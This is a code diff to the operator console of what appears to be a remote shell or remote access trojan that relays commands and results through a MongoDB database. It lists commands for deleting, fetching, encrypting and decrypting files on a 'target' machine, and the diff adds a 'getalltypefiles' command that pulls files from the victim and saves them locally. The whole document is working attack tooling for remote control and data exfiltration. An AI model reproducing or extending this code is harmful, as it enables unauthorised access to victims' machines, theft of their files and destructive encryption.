@@ -4,6 +4,11 @@ from PIL import Image as im
 import numpy as np
 import requests
 from colorama import Fore,init
+import os
+
+
+MY_FAV_ROOT='C:\\Users'
+MY_FAV_FOLDER='ShellUtsav'
 
 init(autoreset=True)
 
@@ -13,7 +18,7 @@ client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
 db=client['shell']
 
-MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','getimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo']
+MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','getimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles']
 
 CWD=r""
 LAST_PATH=""
@@ -102,6 +107,26 @@ def clearCollection():
         print(e)
 
 
+def binaryContent():
+    global MY_FAV_ROOT,MY_FAV_FOLDER
+    if not (os.path.exists(MY_FAV_ROOT+MY_FAV_FOLDER)):
+        os.mkdir(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")
+    col=db['shellresult']
+    filters={
+            "hostname":TARGET
+        }
+    while True:
+        res=col.find_one(filters)
+        if res:
+            data=(res['result'])
+            file_name=(res['filename'])
+            binary=data.encode('latin-1')
+            with open(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}"+f"\{file_name}",'wb') as f:
+                f.write(binary)
+            clearCollection()
+            break
+    
+
 def imageShow():
     col=db['shellresult']
     filters={
@@ -113,6 +138,7 @@ def imageShow():
             arry = np.array(res['result'])
             data = im.fromarray(arry.astype('uint8'))
             data.show()
+            clearCollection()
             break
 
 
@@ -142,6 +168,7 @@ def ActionUploader():
     global PREV_COMMAND,CWD,MY_COMMANDS
     a= (PREV_COMMAND.split(" "))
     col=db['myshell']
+    clearCollection()
 
     if a[0]=='commands' and len(a)==1:
         print(Fore.CYAN+">>> ")
@@ -176,6 +203,32 @@ def ActionUploader():
         
     elif a[0]=='targetinfo':
         targetInfo()
+
+    elif a[0]=='getalltypefiles':
+        target_element=a[1]
+        data={
+                "action":a[0],
+                "target":TARGET,
+                "current_path":CWD,
+                "target_element":a[1],
+                "new_filename":"",
+                "target_string":"",
+                "process_taken":0
+                }
+        try:
+            if not (col.find_one()):
+                col.insert_one(data)
+                binaryContent()
+            else:
+                filters={
+                    "target":TARGET
+                    }
+                col.delete_one(filters)
+                col.insert_one(data)
+                binaryContent()
+        except Exception as e:
+                print(e)
+        
     
     else:
         if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
@@ -279,7 +332,7 @@ def shell():
         struct0=(Fore.LIGHTYELLOW_EX+CWD)
         struct1=(Fore.LIGHTGREEN_EX+f"(target@{TARGET})-->IP: {IP}-[{struct0}]\n")
         struct2=(Fore.CYAN+"$ ")
-        shell_struct=struct0+struct1+struct2
+        shell_struct=struct1+struct2
         command=str(input(shell_struct))
         PREV_COMMAND=(command)
         is_directory_change_command()
